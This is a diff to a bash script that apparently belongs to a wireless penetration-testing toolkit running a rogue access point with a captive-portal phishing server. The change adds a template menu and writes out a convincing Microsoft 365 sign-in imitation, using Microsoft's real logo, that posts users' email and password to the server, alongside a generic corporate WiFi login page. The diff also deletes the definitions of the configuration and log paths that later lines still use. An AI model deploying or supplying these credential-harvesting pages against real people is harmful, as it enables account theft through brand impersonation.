@@ -38,18 +38,46 @@ if [[ -z "$INTERFACE" ]]; then
     exit 1
 fi
 
-echo "[*] Starting Captive Portal phishing server on ${INTERFACE}..."
+echo "[*] Initializing Phishing Template System..."
+echo "[?] Select Template:"
+echo "    1) Generic Corporate (Internal)"
+echo "    2) Microsoft 365 (High-Fidelity)"
+read -p "Selection [1/2]: " template_choice
 
-# 1. Prepare configurations
 PHISH_DIR="${EVIDENCE_PREFIX}_portal"
 mkdir -p "$PHISH_DIR"
-HOSTAPD_CONF="${EVIDENCE_PREFIX}_hostapd.conf"
-DNSMASQ_CONF="${EVIDENCE_PREFIX}_dnsmasq.conf"
-SERVER_LOG="${EVIDENCE_DIR}/${TC_ID}_server.log"
-HOSTAPD_LOG="${EVIDENCE_DIR}/${TC_ID}_hostapd.log"
-DNSMASQ_LOG="${EVIDENCE_DIR}/${TC_ID}_dnsmasq.log"
 
-cat <<EOF > "$PHISH_DIR/index.html"
+if [[ "$template_choice" == "2" ]]; then
+    echo "[*] Deploying Microsoft 365 template..."
+    cat <<EOF > "$PHISH_DIR/index.html"
+<!DOCTYPE html>
+<html>
+<head><title>Sign in to your account</title>
+<style>
+    body { font-family: 'Segoe UI', sans-serif; background: #f2f2f2; display: flex; align-items: center; justify-content: center; height: 100vh; margin: 0; }
+    .login-box { background: white; padding: 40px; width: 350px; box-shadow: 0 2px 4px rgba(0,0,0,0.1); }
+    .logo { width: 100px; margin-bottom: 20px; }
+    h1 { font-size: 24px; margin-bottom: 20px; }
+    input { width: 100%; padding: 10px; margin-bottom: 15px; border: 1px solid #ccc; box-sizing: border-box; }
+    input[type="submit"] { background: #0067b8; color: white; border: none; cursor: pointer; }
+</style>
+</head>
+<body>
+    <div class="login-box">
+        <img src="https://logincdn.msauth.net/shared/1.0/content/images/microsoft_logo_ee5c8d9623595f45e6a706fdd13424d0.svg" class="logo">
+        <h1>Sign in</h1>
+        <form action="/login" method="POST">
+            <input type="email" name="user" placeholder="Email, phone, or Skype">
+            <input type="password" name="pass" placeholder="Password">
+            <input type="submit" value="Next">
+        </form>
+    </div>
+</body>
+</html>
+EOF
+else
+    echo "[*] Deploying Generic Corporate template..."
+    cat <<EOF > "$PHISH_DIR/index.html"
 <html>
 <head><title>WiFi Authentication Required</title></head>
 <body style="font-family: sans-serif; text-align: center; padding-top: 50px;">
@@ -65,6 +93,7 @@ cat <<EOF > "$PHISH_DIR/index.html"
 </body>
 </html>
 EOF
+fi
 
 cat <<EOF > "$HOSTAPD_CONF"
 interface=$INTERFACE
